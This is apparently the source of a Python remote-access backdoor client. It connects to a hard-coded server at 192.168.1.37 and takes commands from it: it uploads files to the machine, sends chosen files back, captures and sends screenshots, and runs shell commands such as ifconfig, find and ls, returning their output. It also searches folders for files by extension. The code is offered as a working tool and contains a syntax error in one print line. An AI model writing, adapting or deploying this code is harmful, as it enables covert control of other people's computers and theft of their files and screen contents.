import socket
import os
import platform
import subprocess
import sys
import glob
import pyautogui
from PIL import Image
import random

GENERIC_READ = -2147483648
FILE_SHARE_WRITE = 2
FILE_SHARE_READ = 1
FILE_SHARE_DELETE = 4
CREATE_ALWAYS = 2

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server = "192.168.1.37"
port = 12345

print ("Established connection to :", server, ":", port)

client.connect((server, port))

try: 
     

    while True:
        
        command = client.recv(1024).decode('utf-8')

        if command == 'upload':
            filename = client.recv(6000)
            newfile = open(filename, 'wb')
            data = client.recv(6000)
            newfile.write(data)
            newfile.close()
        elif command[:8] == 'download':
                    
            file = open (command.split(" ")[1], 'rb') 
            data = file.read()
            client.sendall(data)
        elif command == 'screenshot':
           try:
              file = f'{random.randint(111111, 444444)}.jpg'
              file2 = f'{random.randint(555555, 999999)}.jpg'
              pyautogui.screenshot(file)
              image = Image.open(file)
              new_image = image.resize((1920, 1080))
              new_image.save(file2)
              with open(file2, 'rb') as img_file:
              
                  data = img_file.read()
                  client.sendall(data)
           except Exception as e:
                 print("Error capturing screenshot:", str(e)")
            
        elif command == 'exit':
            sys.exit()  
        
        elif command.startswith("ifconfig") :
             result = subprocess.run(command, shell=True, capture_output= True, text=True)
             print(result.stdout)
             client.sendall((result.stdout).encode('utf-8'))
        
        elif command.startswith("find") :
             result = subprocess.run(command, shell=True, capture_output= True, text=True)
             print(result.stdout)
             client.sendall(result.stdout.encode('utf-8'))
           
        elif command[:6] == "search":  
             repertoire_recherche, extension = command.split(" ")
             for x in glob.glob(os.path.join(repertoire_recherche, '**', '*'), recursive=True):
              if x.endswith(extension):
                chemin_absolu = os.path.abspath(x)
                client.sendall(str(chemin_absolu).encode('utf-8'))  
        elif command == 'pwd':
             curdir = str(os.getcwd())
             print(curdir)
             client.sendall(curdir.encode('utf-8'))
        elif command == 'ls':
             result = subprocess.run(command, shell=True, capture_output= True, text=True)
             print(result.stdout)
             client.sendall((result.stdout).encode('utf-8'))

        elif command[:2] == 'cd':
           new_directory = command[2:].strip()
           os.chdir(new_directory)
           #current_directory = os.getcwd()
           #print(new_directory)
           client.sendall(new_directory.encode())
           #output = subprocess.getoutput(command)
           #client.sendall(output.encode())

        elif command == 'cd ..':
            os.chdir('..')
            curdir = str(os.getcwd())
            client.sendall(curdir.encode('utf-8'))
            
        elif command == 'dir':

            output = subprocess.check_output(["dir"], shell=True)
            output = output.decode('utf8', errors='ignore')
            client.sendall(output.encode('utf-8'))
            
   
finally:
    client.close()


